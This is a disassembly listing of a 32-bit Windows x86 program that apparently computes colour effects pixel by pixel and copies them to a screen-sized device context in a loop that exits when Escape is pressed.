  401ea3:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
  401ea8:	f7 64 24 34          	mull   0x34(%esp)
  401eac:	f3 0f 5e c6          	divss  %xmm6,%xmm0
  401eb0:	c1 ea 05             	shr    $0x5,%edx
  401eb3:	03 d7                	add    %edi,%edx
  401eb5:	03 d6                	add    %esi,%edx
  401eb7:	0f b6 c2             	movzbl %dl,%eax
  401eba:	f3 0f 59 d5          	mulss  %xmm5,%xmm2
  401ebe:	f3 0f 58 d8          	addss  %xmm0,%xmm3
  401ec2:	66 0f 6e c0          	movd   %eax,%xmm0
  401ec6:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  401eca:	c1 e8 1f             	shr    $0x1f,%eax
  401ecd:	f3 0f 59 dd          	mulss  %xmm5,%xmm3
  401ed1:	f2 0f 58 04 c5 70 64 	addsd  0x406470(,%eax,8),%xmm0
  401ed8:	40 00 
  401eda:	b8 89 88 88 88       	mov    $0x88888889,%eax
  401edf:	f7 64 24 34          	mull   0x34(%esp)
  401ee3:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  401ee7:	c1 ea 04             	shr    $0x4,%edx
  401eea:	33 d7                	xor    %edi,%edx
  401eec:	33 d6                	xor    %esi,%edx
  401eee:	8b c2                	mov    %edx,%eax
  401ef0:	33 d2                	xor    %edx,%edx
  401ef2:	f7 f1                	div    %ecx
  401ef4:	f3 0f 5e c6          	divss  %xmm6,%xmm0
  401ef8:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  401efc:	f3 0f 59 cd          	mulss  %xmm5,%xmm1
  401f00:	83 fa 02             	cmp    $0x2,%edx
  401f03:	73 09                	jae    0x401f0e
  401f05:	0f 28 d4             	movaps %xmm4,%xmm2
  401f08:	0f 28 dc             	movaps %xmm4,%xmm3
  401f0b:	0f 28 cc             	movaps %xmm4,%xmm1
  401f0e:	8b 54 24 38          	mov    0x38(%esp),%edx
  401f12:	47                   	inc    %edi
  401f13:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401f17:	f3 0f 59 d6          	mulss  %xmm6,%xmm2
  401f1b:	f3 0f 59 de          	mulss  %xmm6,%xmm3
  401f1f:	f3 0f 2c ca          	cvttss2si %xmm2,%ecx
  401f23:	f3 0f 10 54 24 10    	movss  0x10(%esp),%xmm2
  401f29:	88 4c 02 02          	mov    %cl,0x2(%edx,%eax,1)
  401f2d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401f31:	f3 0f 2c cb          	cvttss2si %xmm3,%ecx
  401f35:	f3 0f 10 5c 24 54    	movss  0x54(%esp),%xmm3
  401f3b:	f3 0f 59 ce          	mulss  %xmm6,%xmm1
  401f3f:	88 4c 02 01          	mov    %cl,0x1(%edx,%eax,1)
  401f43:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401f47:	f3 0f 10 74 24 58    	movss  0x58(%esp),%xmm6
  401f4d:	f3 0f 2c c9          	cvttss2si %xmm1,%ecx
  401f51:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  401f54:	83 c2 04             	add    $0x4,%edx
  401f57:	8b 44 24 24          	mov    0x24(%esp),%eax
  401f5b:	89 54 24 38          	mov    %edx,0x38(%esp)
  401f5f:	3b f8                	cmp    %eax,%edi
  401f61:	0f 8c c9 fd ff ff    	jl     0x401d30
  401f67:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  401f6b:	8b 54 24 14          	mov    0x14(%esp),%edx
  401f6f:	46                   	inc    %esi
  401f70:	8d 3c 85 00 00 00 00 	lea    0x0(,%eax,4),%edi
  401f77:	03 cf                	add    %edi,%ecx
  401f79:	89 74 24 20          	mov    %esi,0x20(%esp)
  401f7d:	89 4c 24 3c          	mov    %ecx,0x3c(%esp)
  401f81:	3b f2                	cmp    %edx,%esi
  401f83:	0f 8c 37 fd ff ff    	jl     0x401cc0
  401f89:	8b 7c 24 24          	mov    0x24(%esp),%edi
  401f8d:	80 7c 24 0b 00       	cmpb   $0x0,0xb(%esp)
  401f92:	74 31                	je     0x401fc5
  401f94:	0f af d7             	imul   %edi,%edx
  401f97:	33 c9                	xor    %ecx,%ecx
  401f99:	85 d2                	test   %edx,%edx
  401f9b:	7e 24                	jle    0x401fc1
  401f9d:	0f 1f 00             	nopl   (%eax)
  401fa0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401fa4:	80 74 88 02 7f       	xorb   $0x7f,0x2(%eax,%ecx,4)
  401fa9:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401fad:	80 74 88 01 7f       	xorb   $0x7f,0x1(%eax,%ecx,4)
  401fb2:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401fb6:	80 34 88 7f          	xorb   $0x7f,(%eax,%ecx,4)
  401fba:	83 c1 04             	add    $0x4,%ecx
  401fbd:	3b ca                	cmp    %edx,%ecx
  401fbf:	7c df                	jl     0x401fa0
  401fc1:	8b 54 24 14          	mov    0x14(%esp),%edx
  401fc5:	8b 74 24 5c          	mov    0x5c(%esp),%esi
  401fc9:	8b 44 24 18          	mov    0x18(%esp),%eax
  401fcd:	68 20 00 cc 00       	push   $0xcc0020
  401fd2:	6a 00                	push   $0x0
  401fd4:	6a 00                	push   $0x0
  401fd6:	56                   	push   %esi
  401fd7:	52                   	push   %edx
  401fd8:	57                   	push   %edi
  401fd9:	6a 00                	push   $0x0
  401fdb:	6a 00                	push   $0x0
  401fdd:	50                   	push   %eax
  401fde:	ff 15 20 60 40 00    	call   *0x406020
  401fe4:	56                   	push   %esi
  401fe5:	ff 15 10 60 40 00    	call   *0x406010
  401feb:	6a 10                	push   $0x10
  401fed:	ff 15 64 60 40 00    	call   *0x406064
  401ff3:	6a 1b                	push   $0x1b
  401ff5:	ff 15 c8 60 40 00    	call   *0x4060c8
  401ffb:	8b 74 24 18          	mov    0x18(%esp),%esi
  401fff:	66 85 c0             	test   %ax,%ax
  402002:	0f 84 48 fc ff ff    	je     0x401c50
  402008:	ff 74 24 40          	push   0x40(%esp)
  40200c:	ff 15 18 60 40 00    	call   *0x406018
  402012:	56                   	push   %esi
  402013:	6a 00                	push   $0x0
  402015:	ff 15 b0 60 40 00    	call   *0x4060b0
  40201b:	8b 8c 24 8c 00 00 00 	mov    0x8c(%esp),%ecx
  402022:	33 c0                	xor    %eax,%eax
  402024:	5f                   	pop    %edi
  402025:	5e                   	pop    %esi
  402026:	33 cc                	xor    %esp,%ecx
  402028:	e8 97 2e 00 00       	call   0x404ec4
  40202d:	8b e5                	mov    %ebp,%esp
  40202f:	5d                   	pop    %ebp
  402030:	c2 04 00             	ret    $0x4
  402033:	cc                   	int3
  402034:	cc                   	int3
  402035:	cc                   	int3
  402036:	cc                   	int3
  402037:	cc                   	int3
  402038:	cc                   	int3
  402039:	cc                   	int3
  40203a:	cc                   	int3
  40203b:	cc                   	int3
  40203c:	cc                   	int3
  40203d:	cc                   	int3
  40203e:	cc                   	int3
  40203f:	cc                   	int3
  402040:	55                   	push   %ebp
  402041:	8b ec                	mov    %esp,%ebp
  402043:	83 e4 f8             	and    $0xfffffff8,%esp
  402046:	81 ec a0 00 00 00    	sub    $0xa0,%esp
  40204c:	a1 08 80 40 00       	mov    0x408008,%eax
  402051:	33 c4                	xor    %esp,%eax
  402053:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%esp)
  40205a:	56                   	push   %esi
  40205b:	57                   	push   %edi
  40205c:	6a 00                	push   $0x0
  40205e:	ff 15 b8 60 40 00    	call   *0x4060b8
  402064:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  40206a:	6a 00                	push   $0x0
  40206c:	89 44 24 20          	mov    %eax,0x20(%esp)
  402070:	ff d6                	call   *%esi
  402072:	8b f8                	mov    %eax,%edi
  402074:	6a 01                	push   $0x1
  402076:	89 7c 24 34          	mov    %edi,0x34(%esp)
  40207a:	ff d6                	call   *%esi
  40207c:	6a 00                	push   $0x0
  40207e:	8b f0                	mov    %eax,%esi
  402080:	c7 44 24 7c 28 00 00 	movl   $0x28,0x7c(%esp)
  402087:	00 
  402088:	6a 00                	push   $0x0
  40208a:	8d 44 24 34          	lea    0x34(%esp),%eax
  40208e:	89 74 24 74          	mov    %esi,0x74(%esp)
  402092:	50                   	push   %eax
  402093:	6a 00                	push   $0x0
  402095:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  40209c:	89 bc 24 8c 00 00 00 	mov    %edi,0x8c(%esp)
  4020a3:	50                   	push   %eax
  4020a4:	ff 74 24 30          	push   0x30(%esp)
  4020a8:	0f 57 c0             	xorps  %xmm0,%xmm0
  4020ab:	89 b4 24 98 00 00 00 	mov    %esi,0x98(%esp)
  4020b2:	c7 84 24 9c 00 00 00 	movl   $0x200001,0x9c(%esp)
  4020b9:	01 00 20 00 
  4020bd:	c7 84 24 a0 00 00 00 	movl   $0x0,0xa0(%esp)
  4020c4:	00 00 00 00 
  4020c8:	0f 11 84 24 a4 00 00 	movups %xmm0,0xa4(%esp)
  4020cf:	00 
  4020d0:	66 0f d6 84 24 b4 00 	movq   %xmm0,0xb4(%esp)
  4020d7:	00 00 
  4020d9:	ff 15 04 60 40 00    	call   *0x406004
  4020df:	0f 57 c0             	xorps  %xmm0,%xmm0
  4020e2:	89 44 24 40          	mov    %eax,0x40(%esp)
  4020e6:	6a 1b                	push   $0x1b
  4020e8:	f3 0f 11 44 24 10    	movss  %xmm0,0x10(%esp)
  4020ee:	ff 15 c8 60 40 00    	call   *0x4060c8
  4020f4:	66 85 c0             	test   %ax,%ax
  4020f7:	0f 85 5b 05 00 00    	jne    0x402658
  4020fd:	66 0f 6e c7          	movd   %edi,%xmm0
  402101:	66 0f 6e ce          	movd   %esi,%xmm1
  402105:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  402108:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  40210b:	f3 0f 5e c1          	divss  %xmm1,%xmm0
  40210f:	f3 0f 11 44 24 44    	movss  %xmm0,0x44(%esp)
  402115:	ff 74 24 1c          	push   0x1c(%esp)
  402119:	ff 15 08 60 40 00    	call   *0x406008
  40211f:	ff 74 24 40          	push   0x40(%esp)
  402123:	89 44 24 40          	mov    %eax,0x40(%esp)
  402127:	50                   	push   %eax
  402128:	ff 15 00 60 40 00    	call   *0x406000
  40212e:	f3 0f 10 44 24 0c    	movss  0xc(%esp),%xmm0
  402134:	f3 0f 58 05 8c 63 40 	addss  0x40638c,%xmm0
  40213b:	00 
  40213c:	f3 0f 11 44 24 0c    	movss  %xmm0,0xc(%esp)
  402142:	f3 0f 59 05 a8 63 40 	mulss  0x4063a8,%xmm0
  402149:	00 
  40214a:	f3 0f 11 44 24 5c    	movss  %xmm0,0x5c(%esp)
  402150:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402153:	e8 e4 3b 00 00       	call   0x405d3c
  402158:	f3 0f 10 0d b0 63 40 	movss  0x4063b0,%xmm1
  40215f:	00 
  402160:	0f 57 ed             	xorps  %xmm5,%xmm5
  402163:	f2 0f 5a e8          	cvtsd2ss %xmm0,%xmm5
  402167:	33 c9                	xor    %ecx,%ecx
  402169:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  40216d:	f3 0f 59 e9          	mulss  %xmm1,%xmm5
  402171:	f3 0f 58 2d d0 63 40 	addss  0x4063d0,%xmm5
  402178:	00 
  402179:	f3 0f 11 6c 24 68    	movss  %xmm5,0x68(%esp)
  40217f:	85 f6                	test   %esi,%esi
  402181:	0f 8e 47 04 00 00    	jle    0x4025ce
  402187:	8b 44 24 30          	mov    0x30(%esp),%eax
  40218b:	33 d2                	xor    %edx,%edx
  40218d:	89 54 24 38          	mov    %edx,0x38(%esp)
  402191:	33 ff                	xor    %edi,%edi
  402193:	85 c0                	test   %eax,%eax
  402195:	0f 8e 15 04 00 00    	jle    0x4025b0
  40219b:	66 0f 6e c6          	movd   %esi,%xmm0
  40219f:	8b f2                	mov    %edx,%esi
  4021a1:	66 0f 6e d1          	movd   %ecx,%xmm2
  4021a5:	0f 5b d2             	cvtdq2ps %xmm2,%xmm2
  4021a8:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  4021ab:	f3 0f 5e d0          	divss  %xmm0,%xmm2
  4021af:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  4021b6:	00 
  4021b7:	f3 0f 58 d2          	addss  %xmm2,%xmm2
  4021bb:	f3 0f 5c d0          	subss  %xmm0,%xmm2
  4021bf:	0f 28 da             	movaps %xmm2,%xmm3
  4021c2:	f3 0f 11 54 24 48    	movss  %xmm2,0x48(%esp)
  4021c8:	f3 0f 59 da          	mulss  %xmm2,%xmm3
  4021cc:	f3 0f 10 54 24 0c    	movss  0xc(%esp),%xmm2
  4021d2:	0f 28 e2             	movaps %xmm2,%xmm4
  4021d5:	f3 0f 59 e1          	mulss  %xmm1,%xmm4
  4021d9:	0f 28 cd             	movaps %xmm5,%xmm1
  4021dc:	f3 0f 59 ca          	mulss  %xmm2,%xmm1
  4021e0:	f3 0f 11 64 24 4c    	movss  %xmm4,0x4c(%esp)
  4021e6:	f3 0f 11 5c 24 64    	movss  %xmm3,0x64(%esp)
  4021ec:	0f 28 e1             	movaps %xmm1,%xmm4
  4021ef:	f3 0f 11 4c 24 54    	movss  %xmm1,0x54(%esp)
  4021f5:	f3 0f 58 e1          	addss  %xmm1,%xmm4
  4021f9:	0f 28 ca             	movaps %xmm2,%xmm1
  4021fc:	f3 0f 59 0d b8 63 40 	mulss  0x4063b8,%xmm1
  402203:	00 
  402204:	f3 0f 11 4c 24 58    	movss  %xmm1,0x58(%esp)
  40220a:	0f 28 ca             	movaps %xmm2,%xmm1
  40220d:	f3 0f 59 0d 44 64 40 	mulss  0x406444,%xmm1
  402214:	00 
  402215:	f3 0f 11 64 24 50    	movss  %xmm4,0x50(%esp)
  40221b:	f3 0f 11 4c 24 60    	movss  %xmm1,0x60(%esp)
  402221:	66 0f 6e cf          	movd   %edi,%xmm1
  402225:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  402228:	66 0f 6e d0          	movd   %eax,%xmm2
  40222c:	0f 5b d2             	cvtdq2ps %xmm2,%xmm2
  40222f:	f3 0f 5e ca          	divss  %xmm2,%xmm1
  402233:	f3 0f 58 c9          	addss  %xmm1,%xmm1
  402237:	f3 0f 5c c8          	subss  %xmm0,%xmm1
  40223b:	f3 0f 59 4c 24 44    	mulss  0x44(%esp),%xmm1
  402241:	0f 28 c1             	movaps %xmm1,%xmm0
  402244:	f3 0f 11 4c 24 10    	movss  %xmm1,0x10(%esp)
  40224a:	f3 0f 59 c1          	mulss  %xmm1,%xmm0
  40224e:	f3 0f 58 c3          	addss  %xmm3,%xmm0
  402252:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402255:	e8 e8 3a 00 00       	call   0x405d42
  40225a:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  40225e:	f3 0f 58 c0          	addss  %xmm0,%xmm0
  402262:	f3 0f 11 44 24 18    	movss  %xmm0,0x18(%esp)
  402268:	f3 0f 10 44 24 48    	movss  0x48(%esp),%xmm0
  40226e:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402271:	f2 0f 11 44 24 20    	movsd  %xmm0,0x20(%esp)
  402277:	f3 0f 10 44 24 10    	movss  0x10(%esp),%xmm0
  40227d:	dd 44 24 20          	fldl   0x20(%esp)
  402281:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402284:	f2 0f 11 44 24 10    	movsd  %xmm0,0x10(%esp)
  40228a:	dd 44 24 10          	fldl   0x10(%esp)
  40228e:	e8 8b 3a 00 00       	call   0x405d1e
  402293:	dd 5c 24 10          	fstpl  0x10(%esp)
  402297:	f2 0f 10 44 24 10    	movsd  0x10(%esp),%xmm0
  40229d:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  4022a1:	f3 0f 58 44 24 4c    	addss  0x4c(%esp),%xmm0
  4022a7:	f3 0f 11 44 24 10    	movss  %xmm0,0x10(%esp)
  4022ad:	f3 0f 10 44 24 18    	movss  0x18(%esp),%xmm0
  4022b3:	f3 0f 59 05 48 64 40 	mulss  0x406448,%xmm0
  4022ba:	00 
  4022bb:	f3 0f 5c 44 24 50    	subss  0x50(%esp),%xmm0
  4022c1:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4022c4:	e8 73 3a 00 00       	call   0x405d3c
  4022c9:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4022cd:	f3 0f 11 44 24 08    	movss  %xmm0,0x8(%esp)
  4022d3:	f3 0f 10 44 24 10    	movss  0x10(%esp),%xmm0
  4022d9:	f3 0f 59 05 40 64 40 	mulss  0x406440,%xmm0
  4022e0:	00 
  4022e1:	f3 0f 58 44 24 54    	addss  0x54(%esp),%xmm0
  4022e7:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4022ea:	e8 41 3a 00 00       	call   0x405d30
  4022ef:	f3 0f 10 4c 24 08    	movss  0x8(%esp),%xmm1
  4022f5:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4022f9:	f3 0f 59 c8          	mulss  %xmm0,%xmm1
  4022fd:	f3 0f 10 44 24 18    	movss  0x18(%esp),%xmm0
  402303:	f3 0f 59 05 2c 64 40 	mulss  0x40642c,%xmm0
  40230a:	00 
  40230b:	f3 0f 11 4c 24 08    	movss  %xmm1,0x8(%esp)
  402311:	f3 0f 58 44 24 58    	addss  0x58(%esp),%xmm0
  402317:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40231a:	e8 1d 3a 00 00       	call   0x405d3c
  40231f:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402323:	f3 0f 11 44 24 20    	movss  %xmm0,0x20(%esp)
  402329:	f3 0f 10 44 24 10    	movss  0x10(%esp),%xmm0
  40232f:	f3 0f 59 05 2c 64 40 	mulss  0x40642c,%xmm0
  402336:	00 
  402337:	f3 0f 5c 44 24 5c    	subss  0x5c(%esp),%xmm0
  40233d:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402340:	e8 eb 39 00 00       	call   0x405d30
  402345:	f3 0f 10 4c 24 20    	movss  0x20(%esp),%xmm1
  40234b:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  40234f:	f3 0f 59 c8          	mulss  %xmm0,%xmm1
  402353:	0f 57 c0             	xorps  %xmm0,%xmm0
  402356:	f3 0f 11 44 24 10    	movss  %xmm0,0x10(%esp)
  40235c:	f3 0f 10 44 24 18    	movss  0x18(%esp),%xmm0
  402362:	f3 0f 59 05 54 64 40 	mulss  0x406454,%xmm0
  402369:	00 
  40236a:	f3 0f 11 4c 24 20    	movss  %xmm1,0x20(%esp)
  402370:	f3 0f 58 44 24 60    	addss  0x60(%esp),%xmm0
  402376:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402379:	f2 0f 11 44 24 70    	movsd  %xmm0,0x70(%esp)
  40237f:	dd 44 24 70          	fldl   0x70(%esp)
  402383:	dd 05 20 64 40 00    	fldl   0x406420
  402389:	e8 96 39 00 00       	call   0x405d24
  40238e:	f3 0f 10 0d a0 63 40 	movss  0x4063a0,%xmm1
  402395:	00 
  402396:	f3 0f 10 2d c4 63 40 	movss  0x4063c4,%xmm5
  40239d:	00 
  40239e:	dd 5c 24 70          	fstpl  0x70(%esp)
  4023a2:	f2 0f 10 44 24 70    	movsd  0x70(%esp),%xmm0
  4023a8:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  4023ac:	0f 2f c8             	comiss %xmm0,%xmm1
  4023af:	76 1d                	jbe    0x4023ce
  4023b1:	f3 0f 10 44 24 08    	movss  0x8(%esp),%xmm0
  4023b7:	0f 28 d5             	movaps %xmm5,%xmm2
  4023ba:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4023bd:	0f 54 05 80 64 40 00 	andps  0x406480,%xmm0
  4023c4:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  4023c8:	f3 0f 5c d0          	subss  %xmm0,%xmm2
  4023cc:	eb 06                	jmp    0x4023d4
  4023ce:	f3 0f 10 54 24 10    	movss  0x10(%esp),%xmm2
  4023d4:	f3 0f 10 5c 24 20    	movss  0x20(%esp),%xmm3
  4023da:	0f 28 c2             	movaps %xmm2,%xmm0
  4023dd:	f3 0f 10 35 b0 63 40 	movss  0x4063b0,%xmm6
  4023e4:	00 
  4023e5:	0f 28 cb             	movaps %xmm3,%xmm1
  4023e8:	0f 2f 74 24 18       	comiss 0x18(%esp),%xmm6
  4023ed:	f3 0f 59 05 b8 63 40 	mulss  0x4063b8,%xmm0
  4023f4:	00 
  4023f5:	0f 28 e5             	movaps %xmm5,%xmm4
  4023f8:	f3 0f 59 ce          	mulss  %xmm6,%xmm1
  4023fc:	f3 0f 59 1d b4 63 40 	mulss  0x4063b4,%xmm3
  402403:	00 
  402404:	f3 0f 58 0d a8 63 40 	addss  0x4063a8,%xmm1
  40240b:	00 
  40240c:	f3 0f 58 de          	addss  %xmm6,%xmm3
  402410:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  402414:	0f 28 c2             	movaps %xmm2,%xmm0
  402417:	f3 0f 59 05 a8 63 40 	mulss  0x4063a8,%xmm0
  40241e:	00 
  40241f:	f3 0f 59 15 ac 63 40 	mulss  0x4063ac,%xmm2
  402426:	00 
  402427:	f3 0f 5d e1          	minss  %xmm1,%xmm4
  40242b:	f3 0f 10 4c 24 08    	movss  0x8(%esp),%xmm1
  402431:	f3 0f 59 0d ac 63 40 	mulss  0x4063ac,%xmm1
  402438:	00 
  402439:	f3 0f 58 da          	addss  %xmm2,%xmm3
  40243d:	f3 0f 58 0d a0 63 40 	addss  0x4063a0,%xmm1
  402444:	00 
  402445:	f3 0f 11 64 24 10    	movss  %xmm4,0x10(%esp)
  40244b:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  40244f:	0f 28 c5             	movaps %xmm5,%xmm0
  402452:	f3 0f 5d c1          	minss  %xmm1,%xmm0
  402456:	f3 0f 11 44 24 20    	movss  %xmm0,0x20(%esp)
  40245c:	0f 28 c5             	movaps %xmm5,%xmm0
  40245f:	f3 0f 5d c3          	minss  %xmm3,%xmm0
  402463:	f3 0f 11 44 24 08    	movss  %xmm0,0x8(%esp)
  402469:	0f 86 86 00 00 00    	jbe    0x4024f5
  40246f:	f3 0f 10 44 24 0c    	movss  0xc(%esp),%xmm0
  402475:	f3 0f 59 05 2c 64 40 	mulss  0x40642c,%xmm0
  40247c:	00 
  40247d:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402480:	e8 b7 38 00 00       	call   0x405d3c
  402485:	0f 57 c9             	xorps  %xmm1,%xmm1
  402488:	f3 0f 10 1d c4 63 40 	movss  0x4063c4,%xmm3
  40248f:	00 
  402490:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  402494:	0f 28 e3             	movaps %xmm3,%xmm4
  402497:	0f 28 d3             	movaps %xmm3,%xmm2
  40249a:	f3 0f 59 0d b0 63 40 	mulss  0x4063b0,%xmm1
  4024a1:	00 
  4024a2:	f3 0f 58 0d b0 63 40 	addss  0x4063b0,%xmm1
  4024a9:	00 
  4024aa:	0f 28 c1             	movaps %xmm1,%xmm0
  4024ad:	f3 0f 59 05 a8 63 40 	mulss  0x4063a8,%xmm0
  4024b4:	00 
  4024b5:	f3 0f 58 44 24 10    	addss  0x10(%esp),%xmm0
  4024bb:	f3 0f 5d e0          	minss  %xmm0,%xmm4
  4024bf:	0f 28 c1             	movaps %xmm1,%xmm0
  4024c2:	f3 0f 59 05 a4 63 40 	mulss  0x4063a4,%xmm0
  4024c9:	00 
  4024ca:	f3 0f 59 0d ac 63 40 	mulss  0x4063ac,%xmm1
  4024d1:	00 
  4024d2:	f3 0f 58 44 24 20    	addss  0x20(%esp),%xmm0
  4024d8:	f3 0f 58 4c 24 08    	addss  0x8(%esp),%xmm1
  4024de:	f3 0f 5d d0          	minss  %xmm0,%xmm2
  4024e2:	0f 28 c3             	movaps %xmm3,%xmm0
  4024e5:	f3 0f 5d c1          	minss  %xmm1,%xmm0
  4024e9:	f3 0f 11 54 24 20    	movss  %xmm2,0x20(%esp)
  4024ef:	f3 0f 11 44 24 08    	movss  %xmm0,0x8(%esp)
  4024f5:	f2 0f 10 0d f8 63 40 	movsd  0x4063f8,%xmm1
  4024fc:	00 
  4024fd:	0f 5a c4             	cvtps2pd %xmm4,%xmm0
  402500:	e8 31 38 00 00       	call   0x405d36
  402505:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402509:	f2 0f 10 0d f0 63 40 	movsd  0x4063f0,%xmm1
  402510:	00 
  402511:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402515:	f3 0f 59 05 60 64 40 	mulss  0x406460,%xmm0
  40251c:	00 
  40251d:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
  402521:	f3 0f 10 44 24 20    	movss  0x20(%esp),%xmm0
  402527:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40252a:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  40252e:	e8 03 38 00 00       	call   0x405d36
  402533:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402537:	f2 0f 10 0d 00 64 40 	movsd  0x406400,%xmm1
  40253e:	00 
  40253f:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402543:	f3 0f 59 05 60 64 40 	mulss  0x406460,%xmm0
  40254a:	00 
  40254b:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
  40254f:	f3 0f 10 44 24 08    	movss  0x8(%esp),%xmm0
  402555:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402558:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  40255c:	e8 d5 37 00 00       	call   0x405d36
  402561:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402565:	47                   	inc    %edi
  402566:	f3 0f 10 5c 24 64    	movss  0x64(%esp),%xmm3
  40256c:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  402570:	f3 0f 59 05 60 64 40 	mulss  0x406460,%xmm0
  402577:	00 
  402578:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
  40257c:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  402583:	00 
  402584:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  402587:	83 c6 04             	add    $0x4,%esi
  40258a:	8b 44 24 30          	mov    0x30(%esp),%eax
  40258e:	3b f8                	cmp    %eax,%edi
  402590:	0f 8c 8b fc ff ff    	jl     0x402221
  402596:	f3 0f 10 0d b0 63 40 	movss  0x4063b0,%xmm1
  40259d:	00 
  40259e:	f3 0f 10 6c 24 68    	movss  0x68(%esp),%xmm5
  4025a4:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4025a8:	8b 54 24 38          	mov    0x38(%esp),%edx
  4025ac:	8b 74 24 6c          	mov    0x6c(%esp),%esi
  4025b0:	41                   	inc    %ecx
  4025b1:	8d 3c 85 00 00 00 00 	lea    0x0(,%eax,4),%edi
  4025b8:	03 d7                	add    %edi,%edx
  4025ba:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  4025be:	89 54 24 38          	mov    %edx,0x38(%esp)
  4025c2:	3b ce                	cmp    %esi,%ecx
  4025c4:	0f 8c c7 fb ff ff    	jl     0x402191
  4025ca:	8b 7c 24 30          	mov    0x30(%esp),%edi
  4025ce:	f3 0f 10 44 24 0c    	movss  0xc(%esp),%xmm0
  4025d4:	f3 0f 59 05 cc 63 40 	mulss  0x4063cc,%xmm0
  4025db:	00 
  4025dc:	68 20 00 cc 00       	push   $0xcc0020
  4025e1:	6a 00                	push   $0x0
  4025e3:	6a 00                	push   $0x0
  4025e5:	ff 74 24 48          	push   0x48(%esp)
  4025e9:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4025ec:	56                   	push   %esi
  4025ed:	57                   	push   %edi
  4025ee:	e8 3d 37 00 00       	call   0x405d30
  4025f3:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4025f7:	f3 0f 59 05 38 64 40 	mulss  0x406438,%xmm0
  4025fe:	00 
  4025ff:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  402603:	f3 0f 10 44 24 24    	movss  0x24(%esp),%xmm0
  402609:	f3 0f 59 05 c8 63 40 	mulss  0x4063c8,%xmm0
  402610:	00 
  402611:	50                   	push   %eax
  402612:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  402615:	e8 22 37 00 00       	call   0x405d3c
  40261a:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  40261e:	f3 0f 59 05 3c 64 40 	mulss  0x40643c,%xmm0
  402625:	00 
  402626:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  40262a:	50                   	push   %eax
  40262b:	ff 74 24 3c          	push   0x3c(%esp)
  40262f:	ff 15 20 60 40 00    	call   *0x406020
  402635:	ff 74 24 3c          	push   0x3c(%esp)
  402639:	ff 15 10 60 40 00    	call   *0x406010
  40263f:	6a 10                	push   $0x10
  402641:	ff 15 64 60 40 00    	call   *0x406064
  402647:	6a 1b                	push   $0x1b
  402649:	ff 15 c8 60 40 00    	call   *0x4060c8
  40264f:	66 85 c0             	test   %ax,%ax
  402652:	0f 84 bd fa ff ff    	je     0x402115
  402658:	ff 74 24 40          	push   0x40(%esp)
  40265c:	ff 15 18 60 40 00    	call   *0x406018
  402662:	ff 74 24 1c          	push   0x1c(%esp)
  402666:	6a 00                	push   $0x0
  402668:	ff 15 b0 60 40 00    	call   *0x4060b0
  40266e:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  402675:	33 c0                	xor    %eax,%eax
  402677:	5f                   	pop    %edi
  402678:	5e                   	pop    %esi
